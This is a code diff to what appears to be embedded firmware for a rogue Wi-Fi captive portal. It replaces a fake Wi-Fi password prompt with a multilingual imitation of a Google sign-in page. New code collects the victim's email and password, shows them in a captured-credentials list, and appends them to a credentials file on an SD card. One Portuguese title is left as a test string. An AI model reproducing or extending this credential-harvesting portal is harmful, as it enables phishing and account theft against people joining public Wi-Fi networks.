@@ -13,22 +13,25 @@
 #if defined(LANGUAGE_EN_US)
 #define LOGIN_TITLE "Sign in"
 #define LOGIN_SUBTITLE "Sign In With Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Email"
 #define LOGIN_PASSWORD_PLACEHOLDER "Password"
 #define LOGIN_MESSAGE "Please log in to browse securely."
 #define LOGIN_BUTTON "Next"
 #define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
 #define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
 #elif defined(LANGUAGE_PT_BR)
-#define LOGIN_TITLE "ERRO!"
-#define LOGIN_SUBTITLE "Senha Incorreta!"
+#define LOGIN_TITLE "TESTEEEE"
+#define LOGIN_SUBTITLE "Use sua Conta do Google"
+#define LOGIN_EMAIL_PLACEHOLDER "E-mail"
 #define LOGIN_PASSWORD_PLACEHOLDER "Senha"
-#define LOGIN_MESSAGE "Por favor, digite a senha correta do seu wifi."
+#define LOGIN_MESSAGE "Por favor, faça login para navegar de forma segura."
 #define LOGIN_BUTTON "Avançar"
 #define LOGIN_AFTER_MESSAGE "Fazendo login..."
 #define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
 #elif defined(LANGUAGE_IT_IT)
 #define LOGIN_TITLE "Accedi"
 #define LOGIN_SUBTITLE "Utilizza il tuo Account Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Email"
 #define LOGIN_PASSWORD_PLACEHOLDER "Password"
 #define LOGIN_MESSAGE "Effettua il login per navigare in sicurezza."
 #define LOGIN_BUTTON "Avanti"
@@ -37,6 +40,7 @@
 #elif defined(LANGUAGE_FR_FR)
 #define LOGIN_TITLE "Connexion"
 #define LOGIN_SUBTITLE "Utiliser votre compte Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Adresse e-mail"
 #define LOGIN_PASSWORD_PLACEHOLDER "Mot de passe"
 #define LOGIN_MESSAGE "Merci de vous connecter pour obtenir une navigation sécurisée."
 #define LOGIN_BUTTON "Suivant"
@@ -237,21 +241,22 @@ String index_GET()
 {
   String loginTitle = String(LOGIN_TITLE);
   String loginSubTitle = String(LOGIN_SUBTITLE);
+  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
   String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
   String loginMessage = String(LOGIN_MESSAGE);
   String loginButton = String(LOGIN_BUTTON);
 
-  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
+  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
 }
 
 String index_POST()
 {
+  String email = getInputValue("email");
   String password = getInputValue("password");
-  capturedCredentialsHtml = "<li>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
-  String ssid = getInputValue("ssid");
+  capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
 
 #if defined(SDCARD)
-  appendToFile(SD, SD_CREDS_PATH, String(ssid + " = " + password).c_str());
+  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
 #endif
   return getHtmlContents(LOGIN_AFTER_MESSAGE);
 }
@@ -272,6 +277,7 @@ String ssid_POST()
 
 String clear_GET()
 {
+  String email = "<p></p>";
   String password = "<p></p>";
   capturedCredentialsHtml = "<p></p>";
   totalCapturedCredentials = 0;
